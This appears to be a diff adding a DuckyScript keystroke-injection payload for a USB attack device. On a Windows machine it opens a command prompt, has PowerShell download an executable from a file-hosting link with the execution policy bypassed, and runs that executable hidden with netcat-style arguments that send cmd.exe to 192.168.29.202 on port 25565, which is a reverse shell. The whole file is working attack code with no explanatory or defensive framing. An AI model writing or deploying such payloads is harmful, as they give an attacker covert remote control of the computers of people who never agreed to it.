@@ -1,0 +1,15 @@
+DELAY 400
+GUI r
+DELAY 100
+
+STRING cmd
+ENTER
+DELAY 100
+
+STRING cd / & mkdir win & cd win & echo (wget 'https://1fichier.com/?w90668xj8y4hwognm3xz' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 50
+
+STRING START /MIN a.exe 192.168.29.202 25565 -e cmd.exe -d & exit
+ENTER
+
